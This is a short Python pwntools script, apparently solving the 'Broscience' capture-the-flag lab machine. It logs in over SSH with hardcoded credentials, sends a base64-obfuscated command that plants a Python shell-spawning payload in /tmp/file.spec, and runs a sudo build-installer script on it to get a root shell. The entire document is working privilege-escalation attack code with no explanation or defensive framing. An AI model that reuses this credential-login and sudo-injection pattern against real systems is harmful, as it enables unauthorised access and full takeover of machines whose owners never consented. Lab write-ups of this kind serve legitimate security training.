import requests
import os



try:
    from pwn import *
    print("\n[\033[1;32m+\033[1;37m] Broscience - Ninhpn1337\n")

except:
    print("\n[\033[1;31m!\033[1;37m] Sudo please!\n")
    exit(1)


request = ssh(host="10.129.187.122", user="tkeller", password="denjanjade122566")
shell = request.process("/bin/sh")
time.sleep(0.5)
time.sleep(0.5)
a = b64d('ZWNobyAnaW1wb3J0IG9zO29zLnN5c3RlbSgiL2Jpbi9zaCIpJyA+IC90bXAvZmlsZS5zcGVj')
print(a)
shell.sendline(a)
shell.sendline(b"sudo /usr/local/sbin/build-installer.sh build /tmp/file.spec")
shell.interactive()
